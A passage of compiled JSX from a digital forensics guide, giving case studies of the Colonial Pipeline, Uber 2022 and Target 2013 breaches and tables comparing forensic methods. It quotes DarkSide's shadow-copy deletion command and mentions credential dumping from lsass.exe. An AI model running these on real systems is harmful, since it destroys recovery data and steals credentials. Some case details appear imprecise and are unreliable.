        children: "Evidence Collected:\n- VPN logs (Palo Alto firewall) → identified source IP\n- Windows event logs from compromised servers\n- DarkSide ransomware binary (recovered from encrypted system)\n- Network flow data (Zeek logs on critical segments)\n- Memory dumps from infected systems\n\nKey Forensic Findings:\n\n1. Initial Access (Root Cause Analysis):\n   - VPN account for legacy \"single sign-on\" portal\n   - Account had not been used for several months\n   - No MFA enabled on this account (MFA existed but was optional)\n   - Password potentially obtained from password dump (found in credential stuffing lists)\n   - VPN connection from IP: 89.248.165.58 (known DarkSide C2 infrastructure)\n   - Connection at 19:00 UTC, May 6, 2021\n\n2. Lateral Movement Path:\n   - VPN → IT Server → Domain Controller → Backup Server → Billing Systems\n   - Used native Windows tools: PowerShell, PsExec, WMI\n   - No custom malware → living-off-the-land techniques\n   - Dwell time: <24 hours from VPN access to ransomware execution\n   - This is FAST → attackers already had internal access knowledge\n\n3. Ransomware Analysis (DarkSide):\n   - RaaS (Ransomware-as-a-Service) model\n   - Written in C++\n   - Encrypts with AES-256, RSA-1024 for key protection\n   - Adds extension: .dark\n   - Deletes Volume Shadow Copies: vssadmin.exe delete shadows /all /quiet\n   - 100 GB data exfiltrated before encryption (double extortion)\n   - Ransom demand: ~$4.4 million (75 Bitcoin)\n\n4. Payment and Decryption:\n   - Colonial paid $4.4M in Bitcoin within hours of attack\n   - FBI provided decryption tool weeks later (seized DarkSide servers)\n   - Not all data was recoverable → backup restoration worked better\n   - Actual recovery: primarily from offline backups, not decryption\n\n5. Pipeline Shutdown Analysis:\n   - IT and OT networks not properly air-gapped\n   - Billing systems were on same network as operational controls\n   - Decision to shut down: precautionary → no OT impact but risk was too high\n   - Shutdown imperative: could not bill = could not pump\n   - 5,500 miles of pipeline stopped for 6 days\n\nIR Response Analysis:\n- Responded within hours (ransomware specific IR playbook activated)\n- Immediately involved FBI Cyber Division\n- Engaged Mandiant for forensics\n- Paid ransom (controversial, but approved by CEO and Board)\n- Shut down pipeline rather than risk OT compromise\n\nLessons Learned (critical for US infrastructure):\n1. MFA on ALL VPN access → no exceptions (recommendation from Biden Executive Order)\n2. Air gap between IT and OT networks\n3. Offline, immutable backups (tested regularly)\n4. Ransomware playbook must address: \"pay or not pay\" decision tree\n5. Pipeline bill = pipeline operations → billing availability affects physical operations\n6. DarkSide's infrastructure was eventually taken down by international law enforcement\n7. FBI should be contacted immediately → special ransomware task force available\n8. US government issued Mandatory Pipeline Cybersecurity Requirements (TSA directive)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "123-uber-2022",
      children: "12.3 Uber 2022"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Background:"
      }), " On September 15, 2022, Uber suffered a security breach where an attacker gained access to internal systems through social engineering. The attacker, allegedly an 18-year-old from the Lapsus$ hacking group, tricked an Uber employee into accepting a multi-factor authentication (MFA) prompt, granting initial access."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Technical Attack Chain:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detail"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensic Evidence"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Initial Access"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Social engineering of Uber employee by purchasing their stolen credentials on dark web"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Employee Slack notification led to MFA prompt"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "MFA Fatigue"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attacker repeatedly sent MFA push notifications until employee accepted"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Okta admin logs: 10+ MFA prompts in rapid succession"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Privilege Escalation"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Accessed internal VPN, then escalated to admin access via privileged accounts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "VPN logs, AWS IAM role transitions"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Internal Pivot"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Gained access to: AWS console, GSuite, Slack, HackerOne bug tracker, vCenter"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CloudTrail logs: role assumption changes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Discovery"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attacker posted \"I'm a hacker and Uber has been breached\" to internal Slack"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Slack message logs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Disruption"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attacker changed Cloudflare DNS, accessed HackerOne vulnerability reports"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloudflare audit log, HackerOne access log"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Forensic Investigation (Uber Security + External Forensics):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Evidence Collected:\n- Okta authentication logs → traced MFA acceptance timeline\n- AWS CloudTrail → full IAM activity reconstruction\n- VPN connection logs → attacker IP and session duration\n- Slack audit logs → post-compromise actions\n- Endpoint logs → no malware found (pure credential-based)\n- Dark web monitoring → discovery of employee credential for sale\n\nKey Forensic Findings:\n\n1. Initial Access:\n   - Attacker purchased an Uber contractor's credentials on the dark web\n   - Contractor's personal device was infected with info-stealer\n   - Credential: username + password for Uber's internal VPN\n   - Password was NOT rotated after initial setup (years old)\n   - The password was found in multiple past breaches (Have I Been Pwned)\n\n2. MFA Fatigue Attack:\n   - Attacker attempted to log into Uber internal VPN\n   - Uber used Okta MFA (2FA push notifications)\n   - Attacker sent 10+ MFA push notifications in 30 minutes\n   - Employee finally accepted \"just to make it stop\" (MFA fatigue)\n   - Empathy note: employee at end of shift, thought it was a glitch\n   - This is a well-documented attack technique (MITRE T1621: Multi-Factor Authentication Request Generation)\n\n3. Privilege Escalation:\n   - Once on VPN, accessed IT helpdesk tool\n   - Found an admin's service account credentials in helpdesk scripts\n   - Used these to access \"Thycotic\" → Uber's privileged access management (PAM) system\n   - From Thycotic: extracted full admin credentials for:\n     - AWS (AWS console access)\n     - GSuite (Gmail, Google Drive)\n     - VMware vCenter (virtual machine administration)\n     - Slack admin account\n     - HackerOne bug bounty program access\n\n4. Scope of Access:\n   - AWS: Full read access to S3 buckets, EC2 instances, RDS databases\n   - GSuite: Email and Drive access for Uber employees\n   - vCenter: Could create/delete VMs\n   - HackerOne: Could view reported vulnerabilities (significant security concern)\n   - Slack: Posted message to #general channel announcing breach\n\n5. Actions Taken by Attacker:\n   - Posted to internal Uber Slack: \"I'm a hacker and Uber has been breached\"\n   - Changed Cloudflare DNS for internal services (minor disruption)\n   - Downloaded ~49 GB of data (according to Uber's disclosure)\n   - Screenshots of internal systems posted to social media\n\n6. Containment Timeline:\n   - T+0 minutes: Contractor accepted MFA prompt\n   - T+5 minutes: Attacker accessed VPN\n   - T+15 minutes: Privilege escalation to AWS admin\n   - T+45 minutes: Slack message announcing breach\n   - T+60 minutes: Uber security team began investigation\n   - T+2 hours: Attacker's access revoked (Okta, VPN, AWS)\n   - T+4 hours: Full containment confirmed\n   \n   Total breach window: ~2 hours\n\nIR Response Analysis:\n- Uber security team responded quickly once alerted\n- Law enforcement contacted: FBI investigations\n- Coordinated communication: CEO acknowledgment, public disclosure within 24 hours\n- Hired Mandiant for independent forensic investigation\n- No ransomware or data destruction\n- Attacker alleged to be from Lapsus$ hacking group (linked to other tech breaches)\n\nLessons Learned:\n1. MFA Fatigue is real → implement number matching or MFA conditional access policies\n2. Employees need rest → end-of-shift MFA prompts more likely to be accepted erroneously\n3. Credential rotation is critical → stale credentials are a liability\n4. PAM systems must be locked down → helpdesk should not have access to PAM\n5. Employee personal device security affects corporate security (credential theft from personal device)\n6. Internal communication should have TTP (tools, techniques, procedures) sharing\n7. HackerOne access should be limited → bug bounty program visibility is sensitive\n8. CloudTrail and audit logs must be enabled everywhere → these were key to IR\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "124-target-2013",
      children: "12.4 Target 2013"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Background:"
      }), " During the 2013 holiday season, Target suffered a massive data breach where attackers stole credit/debit card information for 40 million customers and personal information for 70 million customers. The forensic investigation traced the breach back to a third-party HVAC vendor's compromised credentials and POS malware. Total cost: $202 million in settlement and remediation."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Technical Attack Chain (Full Forensic Reconstruction):"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detail"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensic Evidence"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Initial Access"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Spear-phish email sent to Fazio Mechanical (HVAC vendor), malware installed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Fazio's email logs, vendor system analysis"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Vendor Pivot"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attackers used Fazio's credentials to access Target's vendor portal"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Target's vendor portal logs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Lateral Movement"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "From vendor portal to Target internal network"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows event logs, network connections"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "EScalation"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Privilege escalation to domain admin"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AD logs, group membership changes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "POS Identification"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Scanned network for POS systems (PIN pads in 1,797 stores)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network scans, connection logs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Payload Deployment"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Installed \"Kaptoxa\" POS malware on 88,000+ POS terminals"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware analysis, file system artifacts"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Data Exfiltration"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Collected card data from POS memory, exfiltrated via FTP to Russian staging server"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Zeek logs: large outbound data transfers"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Forensic Investigation (Secret Service + Mandiant + Verizon):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Evidence Collected:\n- Fazio Mechanical's email server → identified phishing email\n- Fazio's computer → forensic image, memory dump\n- Target's AD domain controllers → full event log export\n- 88,000+ POS system images → malware extraction\n- Target's network flow data (November 27 → December 15, 2013)\n- Fazio's VPN connection logs\n- Memory dumps from compromised POS systems\n- Stolen data samples from Russian staging server (provided by law enforcement)\n\nKey Forensic Findings:\n\n1. Fazio Mechanical Compromise:\n   - Fazio was Target's HVAC vendor → had network access for billing and project management\n   - Spear-phishing email in October 2013 to Fazio employee\n   - Email contained malicious attachment (likely PDF exploit)\n   - Infostealer malware installed on Fazio's Windows computer\n   - Credentials stolen included: Fazio's Target vendor portal credentials\n\n2. Initial Target Access:\n   - November 12, 2013: Attackers used Fazio's credentials on Target's vendor portal\n   - Portal was web-based ASP.NET application\n   - Attackers pivoted from vendor portal to Target's corporate network\n   - Network path: Internet → Vendor Portal → Target Corporate Network\n   - This was NOT intended → vendor portal should have been segmented\n\n3. Lateral Movement → Step by Step (Reconstructed from Event Logs):\n   - Nov 12: First VPN connection from Fazio credentials → 2 hours\n   - Nov 12-15: Reconnaissance → mapping network, identifying domain controllers\n   - Nov 15: Credential dumping from a domain controller (procdump on lsass.exe)\n   - Nov 18: Domain admin access achieved\n   - Nov 20: Began scanning POS subnets\n   - Nov 27: First POS malware deployed (3 stores)\n   - Dec 2: Malware deployed to full POS fleet (1,797 stores)\n   - Dec 12: Data exfiltration detected by firewall team\n   - Dec 15: Secret Service notified\n\n   Critical finding: Dwell time was 35 days (initial access to detection)\n\n4. Kaptoxa POS Malware Analysis:\n   - Custom malware (not commodity)\n   - Written in C++ with modular architecture\n   - RAM scraping technique: monitored memory of POS application process\n   - Extracted track data from credit/debit cards during transaction processing\n   - Track 1: cardholder name, PAN, expiration date, discretionary data\n   - Track 2: PAN, expiration date, service code, PIN data (pre-EMV)\n   - Data collected into temporary files, then exfiltrated via FTP\n   - Staging server in Russia (IP traced to bulletproof hosting)\n   - Exfiltration path: POS → Store Server → Corporate Network → FTP → Russia\n\n5. Detection Failure Analysis:\n   - FireEye appliance detected the malware on multiple POS systems\n   - FireEye generated alerts on November 30 and December 2\n   - Target's Bangalore SOC reviewed and dismissed the alerts as \"false positives\"\n   - The FireEye screenshots of malware execution were never escalated\n   - Secret Service investigation later confirmed: the FireEye findings were ACCURATE\n   - Human error in SOC was the critical failure\n\n6. Data Exfiltration Quantification:\n   - 40 million unique credit/debit card numbers (Track 1 + Track 2)\n   - 70 million customer PII records (name, address, email, phone)\n   - Exfiltrated over 2 weeks from November 27 to December 15\n   - Stolen cards sold on Rescator[.]cc carding marketplace\n   - Estimated $200M+ in fraud losses\n\n7. Root Cause → Technical and Organizational:\n   - Network segmentation failure: vendor portal connected to corporate network\n   - No MFA on vendor accounts\n   - Antivirus on POS systems: expired signatures\n   - POS systems: Windows XP Embedded (end of life)\n   - SOC alert fatigue: dismissed critical alerts\n   - No data loss prevention (DLP) on outbound traffic\n   - No file integrity monitoring on POS systems\n   - Third-party risk management was inadequate\n\nIR Response Analysis:\n- Discovered by US Secret Service (not Target's security team)\n- Initial confusion: Secret Service notified Target's CEO at 2 AM\n- Target's immediate response: POS malware cleanup (but already too late)\n- Full containment took 72 hours\n- CEO and CIO resigned within months\n- 92 class-action lawsuits filed\n- Total breach cost: $202 million\n- Resulted in widespread EMV chip card adoption in the US\n\nLessons Learned (industry-transforming):\n1. Network segmentation is non-negotiable → vendor networks MUST be isolated\n2. Third-party risk management: audit vendors' security posture before granting access\n3. POS security: EMV chip technology, point-to-point encryption, tokenization\n4. SOC alert triage: every \"critical\" alert must be escalated → no false positives dismissed\n5. MFA for ALL network access → no exceptions for vendors\n6. File integrity monitoring on all critical systems\n7. Data loss prevention on outbound traffic\n8. Threat intelligence sharing: financial sector ISAC improved post-breach\n9. Cybersecurity is a board-level issue, not just IT\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "13-comparison-tables",
      children: "13. Comparison Tables"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "131-forensic-process-phases-comparison",
      children: "13.1 Forensic Process Phases Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Goal"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Input"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Output"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Tools"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Time"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Skill Level"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Identification"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Recognize evidence sources"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Incident report, system listing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Evidence inventory log"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "nmap, lsblk, manual inspection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "30 min-2 hrs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Intermediate"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Preservation"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Maintain evidence integrity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Original evidence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Write-blocked copy, hashes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Write-blocker, sha256sum, certutil"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-4 hrs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Intermediate"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Collection"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Acquire evidence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Preserved evidence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Forensic image, memory dump"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "dd, FTK Imager, LiME, WinPmem"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-8 hrs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Advanced"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Examination"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extract and prepare data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Forensic image"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Recovered files, artifacts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sleuth Kit, Autopsy, Bulk Extractor, Plaso"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4-24 hrs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Advanced"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Analysis"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Draw conclusions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Examined artifacts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Findings, timeline, attribution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Volatility, Wireshark, Plaso, RegRipper"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8-80 hrs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Expert"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Presentation"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Communicate findings"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Analysis results"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Report, testimony, visual aids"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Python, PowerShell, Mermaid, Word"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4-40 hrs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Expert"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "132-disk-vs-memory-vs-network-vs-mobile-forensics-comparison",
      children: "13.2 Disk vs Memory vs Network vs Mobile Forensics Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disk Forensics"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Memory Forensics"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Network Forensics"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mobile Forensics"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Evidence Lifetime"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Years (non-volatile)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Milliseconds to seconds"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hours to days"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Days to years"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Acquisition Complexity"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (write-blocker required)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (must run on live system)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (passive capture)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (encryption, lock screen)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Data Volume"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "500 GB - 10 TB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4 GB - 256 GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "100 MB - 100 TB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8 GB - 512 GB"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Primary Artifacts"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Files, deleted files, slack space, MFT, registry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Processes, network connections, DLLs, injected code"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Packets, connections, protocols, files transferred"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SMS, calls, contacts, apps, GPS, media"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Key Insight"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What files existed and when"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What was running and where connected"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What data went where"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Who the user communicated with"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Can Recover Deleted Data?"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (until overwritten)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No (lost on reboot)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Only if captured"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limited (flash wear)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Impact on System"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None (with write-blocker)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Some (acquiring memory alters it)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None (passive)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Some (device may be altered)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Tool Examples"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sleuth Kit, Autopsy, FTK Imager, EnCase"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Volatility 3, Rekall, Redline"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Wireshark, Zeek, tcpdump, NetworkMiner"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cellebrite, Magnet AXIOM, ADB"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Legal Admissibility"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (established methodology)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (newer field)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (chain of custody for logs)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (established tool validation)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Typical Analysis Time"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-5 days"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4-24 hours"
          }), (0,jsx_runtime.jsx)(_components.td, {
